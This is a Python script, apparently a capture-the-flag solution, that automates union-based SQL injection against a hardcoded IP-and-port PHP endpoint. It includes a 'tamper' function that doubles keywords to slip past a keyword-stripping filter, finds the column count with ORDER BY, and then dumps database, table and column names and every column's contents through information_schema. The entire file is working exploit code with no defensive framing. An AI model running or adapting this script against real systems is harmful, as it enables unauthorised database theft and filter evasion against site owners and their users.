import urllib.request
import re

#tamper
def deal(payload):
	return payload.replace('or','oorr').replace('and','aandnd').replace('union','uunionnion').replace('select','seselectlect')

def send_data(url):
	url = deal(url)
	res = urllib.request.urlopen(url)
	content = res.read().decode()
	#print(content)
	return content

def define_true(content):
	matchObj = re.search(u'php是世界上最好的语言',content)
	if matchObj:
		return True
	else:
		return False

def get_data(content):
	pattern = re.compile('fuck\S+fuck')
	#print(pattern.findall(content))
	result = pattern.findall(content)
	if result:
		result = result[0]
	#print(result)
	if result:
		result = result.split('fuck')[1]
	return result



url = 'http://123.206.31.85:10018/list.php?id=1'
note = '-- -'
payload_order = "' order by "
payload_union = "99999999' union select "
payload_database = 'concat(0x6675636b,database(),0x6675636b)'
payload_table = 'concat(0x6675636b,group_concat(table_name),0x6675636b) from information_schema.tables where table_schema = '
payload_column = 'concat(0x6675636b,group_concat(column_name),0x6675636b) from information_schema.columns where table_name ='


#get column_num
i = 1
while(True):
	payload = url + payload_order + str(i) + note
	#print(payload)
	content = send_data(payload)
	if not define_true(content):
		break
	i += 1
column_num = i - 1
print("column_num is : " + str(column_num))


payload_base = url + payload_union
for i in (1,column_num-1):
	payload_base = payload_base + str(i) + ','


#get database_name
payload = payload_base + payload_database + note
database_name = get_data(send_data(payload))
print("database_name is : "+database_name)

#get table_name
payload = payload_base + payload_table + "'" + database_name + "'" + note
#print(payload)
table_names = get_data(send_data(payload))
print("This database has table : " +table_names)

for table in table_names.split(','):
	payload = payload_base + payload_column + "'" + table + "'" + note
	column_names = get_data(send_data(payload))
	print("The table '" + table + "'' has columns :" + column_names)
	for column in column_names.split(","):
		#print(payload_base)
		payload_dump = payload_base + 'concat(0x6675636b,group_concat(' + column + '),0x6675636b)' + " from " + database_name + '.' + table + note
		#print(payload_dump)
		value = get_data(send_data(payload_dump))
		print("In the column '" + column + "', the data is :")
		print(value)